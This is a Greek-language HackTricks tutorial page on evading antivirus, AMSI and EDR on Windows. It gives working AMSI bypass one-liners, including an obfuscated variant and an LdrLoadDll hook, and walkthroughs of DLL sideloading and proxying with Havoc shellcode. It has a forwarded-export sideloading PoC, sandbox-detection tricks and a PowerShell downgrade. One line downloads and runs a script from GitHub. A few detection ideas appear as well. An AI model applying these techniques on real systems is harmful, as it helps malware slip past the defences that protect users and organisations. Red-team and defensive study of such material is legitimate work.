# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Σταματήστε τον Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να απενεργοποιήσει το Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί παραπλανώντας το ως άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Η στατική ανίχνευση επιτυγχάνεται σημειώνοντας γνωστές κακόβουλες συμβολοσειρές ή πίνακες bytes σε ένα binary ή script, καθώς και εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σας πιάσει πιο εύκολα, αφού πιθανόν έχουν ήδη αναλυθεί και σημειωθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψετε αυτόν τον τύπο ανίχνευσης:

- **Encryption**

Αν κρυπτογραφήσετε το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σας, αλλά θα χρειαστείτε κάποιο loader για να το αποκρυπτογραφήσετε και να το τρέξετε στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικές συμβολοσειρές στο binary ή το script σας για να περάσει το AV, αλλά αυτό μπορεί να γίνει χρονοβόρο ανάλογα με το τι προσπαθείτε να obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε ενάντια στη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά segments και ζητά από τον Defender να σαρώσει το καθένα ξεχωριστά — έτσι μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή bytes σημαίνονται ως κακόβουλα στο binary σας.

Συστήνω ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτική AV Evasion.

### **Dynamic analysis**

Η δυναμική ανάλυση είναι όταν το AV τρέχει το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι λίγο πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας πολύ καλός τρόπος για να παρακάμψετε τη dynamic analysis των AV. Τα AVs έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να δυσκολέψει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλά να παρακάμψουν το sleep ανάλογα με την υλοποίηση.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τον υπολογιστή του χρήστη. Εδώ μπορείτε να γίνετε πολύ δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα — δεν όλα θα είναι υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι στο "contoso.local" domain, μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει — αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

Turns out ότι το όνομα του υπολογιστή στο Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείτε να ελέγξετε για το computer name στο malware σας πριν από την εκκίνηση — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του defender και μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για αντιπαράθεση με Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως είπαμε και πριν, τα **public tools** τελικά **θα εντοπιστούν**, οπότε πρέπει να αναρωτηθείτε:

Για παράδειγμα, αν θέλετε να dumpάρετε το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι μάλλον ένα από, αν όχι το πιο flag-αρισμένο εργαλείο από AVs και EDRs — ενώ το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χειριστείς για να αποφύγεις τα AVs, οπότε ψάξτε για εναλλακτικές για αυτό που θέλετε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι θα **απενεργοποιήσετε την αυτόματη αποστολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΣΕΤΕ ΣΕ VIRUSTOTAL** αν ο στόχος σας είναι μακροπρόθεσμη evasion. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από κάποιο AV, εγκαταστήστε το σε VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη αποστολή δειγμάτων και δοκιμάστε εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτεραιοποιήστε τη χρήση DLLs για evasion**, από την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγετε τον εντοπισμό σε μερικές περιπτώσεις (εφόσον το payload σας έχει τρόπο να τρέξει ως DLL φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με DLL files για να είστε πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή θύμα και τα κακόβουλα payload(s) δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι επιρρεπή σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε DLL Hijackable/Sideloadable programs μόνοι σας**. Αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable programs, μπορεί να πιαστείτε εύκολα.

Απλώς με το να τοποθετήσετε ένα malicious DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να λύσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και malicious) DLL προς το original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL, και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Κατάχρηση των Forwarded Exports (ForwardSideLoading)

Windows PE modules μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Φορτώσει `TargetDll` αν δεν έχει ήδη φορτωθεί
- Επιλύσει `TargetFunc` από αυτό

Κύριες συμπεριφορές προς κατανόηση:
- Εάν το `TargetDll` είναι ένα KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Εάν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, που περιλαμβάνει τον φάκελο της μονάδας που πραγματοποιεί την επίλυση του forwarded export.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια συνάρτηση που προωθείται (forwarded) σε ένα module name που δεν είναι KnownDLL, και τοποθετήστε αυτό το signed DLL μαζί με ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα όπως το forwarded target module. Όταν το forwarded export κληθεί, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο φάκελο, εκτελώντας το DllMain σας.

Παράδειγμα που παρατηρήθηκε σε Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL του συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για να αποκτήσετε εκτέλεση κώδικα; δεν χρειάζεται να υλοποιήσετε την προωθημένη συνάρτηση για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Ενώ επιλύεται το `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain`
- Εάν το `SetAuditingInterface` δεν είναι υλοποιημένο, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Συμβουλές ανίχνευσης:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Οι KnownDLLs παρατίθενται κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το κατάλογο forwarder των Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Ιδέες ανίχνευσης/άμυνας:
- Παρακολουθήστε LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLLs από μη-συστημικές διαδρομές, ακολουθούμενα από φόρτωση non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Ειδοποίηση για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε write+execute σε καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με έναν διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.

## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσατε με κάποιο τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη σε αυτά τα components των Windows.

- User Account Control, or UAC (ανύψωση δικαιωμάτων για EXE, COM, MSI ή εγκατάσταση ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάζουν τη συμπεριφορά των script αποκαλύπτοντας το περιεχόμενο των script σε μορφή που είναι μη κρυπτογραφημένη και μη ομπφουσκωμένη.

Τρέχοντας `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράξει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει το `amsi:` και μετά το μονοπάτι προς το εκτελέσιμο από το οποίο τρέξε το script, σε αυτή την περίπτωση, powershell.exe

Δεν αποθέσαμε κανένα αρχείο στο δίσκο, αλλά παρόλα αυτά εντοπίστηκε στη μνήμη εξαιτίας του AMSI.

Επιπλέον, από την **.NET 4.8**, ο C# κώδικας περνάει επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό προτείνεται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή παλαιότερες) για εκτέλεση στη μνήμη αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Δεδομένου ότι το AMSI λειτουργεί κυρίως με στατικές detections, η τροποποίηση των script που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει την ικανότητα να απο-ομπφουσκώνει script ακόμα και αν έχουν πολλαπλά επίπεδα, οπότε η ομπφουσκάρισμα μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό το καθιστά όχι τόσο απλό να το αποφύγετε. Αν και, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και είστε εντάξει, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Επειδή το AMSI υλοποιείται φορτώνοντας ένα DLL μέσα στη διεργασία του powershell (και επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να το παραποιήσετε εύκολα ακόμα και λειτουργώντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους για να αποφύγουν τη σάρωση από AMSI.

**Forcing an Error**

Αναγκάζοντας την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διεργασία. Αυτό αρχικά αποκαλύφθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία μόνο γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για το σάρωμα των δεδομένων που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα του πραγματικού σάρωσματος θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε που διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε με τροφοδοσία scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μακροσκελή artefacts της γραμμής εντολών.
- Έχει παρατηρηθεί σε loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` που καλεί `DllRegisterServer`).

Αυτό το εργαλείο [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) επίσης δημιουργεί script για να παρακάμψει το AMSI.

**Αφαίρεση της ανιχνευμένης υπογραφής**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη AMSI υπογραφή από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την AMSI υπογραφή και στη συνέχεια επανεγγράφοντας την με NOP instructions, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε την έκδοση 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις PowerShell εντολές που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για auditing και troubleshooting, αλλά επίσης μπορεί να αποτελεί ένα **πρόβλημα για attackers που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) γι' αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawnάρετε ένα powershell χωρίς defenses (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Obfuscation

> [!TIP]
> Πολλές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, κάτι που θα αυξήσει την entropy του binary και θα διευκολύνει τα AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόστε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή χρειάζονται να κρυφτούν.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή commercial forks) είναι συχνό να αντιμετωπίσετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας αποκαθιστά αξιόπιστα ένα σχεδόν–original IL που μπορεί κατόπιν να γίνει decompile σε C# σε εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον *module* static constructor (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum οπότε οποιαδήποτε αλλαγή θα προκαλέσει crash στο binary. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε το δικό σας unpacker.

2.  Symbol / control-flow recovery – τροφοδοτήστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα original namespaces, classes και τα ονόματα μεταβλητών και θα αποκρυπτογραφήσει constant strings.

3.  Proxy-call stripping – ConfuserEx αντικαθιστά απευθείας method calls με lightweight wrappers (a.k.a *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το προκύπτον binary κάτω από dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά την ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το malicious sample – χρήσιμο όταν δουλεύετε σε offline workstation.

